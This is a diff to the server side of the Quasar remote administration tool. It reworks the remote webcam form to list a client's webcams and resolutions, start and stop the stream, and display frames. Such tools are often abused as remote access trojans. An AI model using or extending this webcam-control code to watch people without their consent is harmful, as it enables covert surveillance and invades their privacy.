@@ -1,5 +1,6 @@
 ﻿using Mono.Cecil.Cil;
 using Quasar.Common.Messages;
+using Quasar.Common.Video;
 using Quasar.Server.Helper;
 using Quasar.Server.Messages;
 using Quasar.Server.Networking;
@@ -22,16 +23,18 @@ namespace Quasar.Server.Forms
         /// The client which can be used for the task manager.
         /// </summary>
         private readonly Client _connectClient;
+        Dictionary<string, List<Resolution>> _webcams = null;
+        public bool IsStarted { get; private set; }
 
         /// <summary>
         /// The message handler for handling the communication with the client.
         /// </summary>
-        private readonly RemoteWebcamHandler _remoteWebcamHandler;
+        private readonly RemoteWebcamHandlerS _remoteWebcamHandler;
 
         public FrmRemoteWebcam(Client client)
         {
             _connectClient = client;
-            _remoteWebcamHandler = new RemoteWebcamHandler(client);
+            _remoteWebcamHandler = new RemoteWebcamHandlerS(client);
             RegisterMessageHandler();
             InitializeComponent();
         }
@@ -55,17 +58,20 @@ namespace Quasar.Server.Forms
             _connectClient.ClientState -= ClientDisconnected;
         }
 
-        private void DisplaysChanged(object sender, int displays)
+        private void DisplaysChanged(object sender, Dictionary<string, List<Resolution>> webcams)
         {
             cbWebcams.Items.Clear();
-            for (int i = 0; i < displays; i++)
-                cbWebcams.Items.Add($"Display {i + 1}");
+           _webcams=webcams;
+            foreach (var webcam in webcams.Keys)
+            {
+                cbWebcams.Items.Add(webcam);
+            }
             cbWebcams.SelectedIndex = 0;
         }
 
         private void UpdateImage(object sender, Bitmap bmp)
         {
-            picWebcam.UpdateImage(bmp, false);
+            picWebcam.Image = new Bitmap(bmp, picWebcam.Width, picWebcam.Height);
         }
 
         private void ClientDisconnected(Client client, bool connected)
@@ -87,6 +93,7 @@ namespace Quasar.Server.Forms
             btnShow.Left = (this.Width / 2) - (btnShow.Width / 2);
 
             _remoteWebcamHandler.RefreshDisplays();
+            _remoteWebcamHandler.LocalResolution = picWebcam.Size;
         }
         // <summary>
         /// Holds the opened Webcam form for each client.
@@ -114,7 +121,7 @@ namespace Quasar.Server.Forms
         }
 
         /// <summary>
-        /// Stops the remote desktop stream.
+        /// Stops the remote Webcam stream.
         /// </summary>
         private void StopStream()
         {
@@ -135,7 +142,7 @@ namespace Quasar.Server.Forms
         /// <param name="e">The new frames per second.</param>
         private void frameCounter_FrameUpdated(FrameUpdatedEventArgs e)
         {
-            this.Text = string.Format("{0} - FPS: {1}", WindowHelper.GetWindowTitle("Remote Desktop", _connectClient), e.CurrentFramesPerSecond.ToString("0.00"));
+            this.Text = string.Format("{0} - FPS: {1}", WindowHelper.GetWindowTitle("Remote Webcam", _connectClient), e.CurrentFramesPerSecond.ToString("0.00"));
         }
 
         /// <summary>
@@ -154,27 +161,67 @@ namespace Quasar.Server.Forms
         {
             if (cbWebcams.Items.Count == 0)
             {
-                MessageBox.Show("No remote webcam detected.\nPlease wait till the client sends a list with available displays.",
+                MessageBox.Show("No webcam detected.\nPlease wait till the client sends a list with available webcams.",
                     "Starting failed", MessageBoxButtons.OK, MessageBoxIcon.Warning);
                 return;
             }
-            StartStream();
+            ToggleControls(false);
+            this.ActiveControl = picWebcam;
+            _connectClient.Send(new GetWebcam
+            {
+                Webcam = cbWebcams.SelectedIndex,
+                Resolution = cbResolutions.SelectedIndex
+            });
         }
 
-        /// <summary>
-        /// Starts the remote desktop stream and begin to receive desktop frames.
-        /// </summary>
-        private void StartStream()
+        private void btnStop_Click(object sender, EventArgs e)
         {
-            ToggleConfigurationControls(true);
-
-            picWebcam.Start();
-            // Subscribe to the new frame counter.
-            picWebcam.SetFrameUpdatedEvent(frameCounter_FrameUpdated);
-
+            ToggleControls(true);
             this.ActiveControl = picWebcam;
 
-            _remoteWebcamHandler.BeginReceiveFrames(0, cbWebcams.SelectedIndex);
+            _connectClient.Send(new DoWebcamStop());
+        }
+
+        public void ToggleControls(bool state)
+        {
+            IsStarted = !state;
+
+            cbWebcams.Enabled = cbResolutions.Enabled = btnStart.Enabled = state;
+            btnStop.Enabled = !state;
+        }
+
+        private void cbWebcams_SelectedIndexChanged(object sender, EventArgs e)
+        {
+            cbResolutions.Invoke((MethodInvoker)delegate
+            {
+                cbResolutions.Items.Clear();
+                foreach (var resolution in this._webcams.ElementAt(cbWebcams.SelectedIndex).Value)
+                {
+                    cbResolutions.Items.Add(resolution.ToString());
+                }
+                cbResolutions.SelectedIndex = 0;
+            });
+        }
+
+        private void FrmRemoteWebcam_Resize(object sender, EventArgs e)
+        {
+            _remoteWebcamHandler.LocalResolution = picWebcam.Size;
+        }
+
+        private void btnHide_Click(object sender, EventArgs e)
+        {
+            panelTop.Visible = false;
+            btnShow.Visible = true;
+            btnHide.Visible = false;
+            this.ActiveControl = picWebcam;
+        }
+
+        private void btnShow_Click(object sender, EventArgs e)
+        {
+            panelTop.Visible = true;
+            btnShow.Visible = false;
+            btnHide.Visible = true;
+            this.ActiveControl = picWebcam;
         }
     }
 }
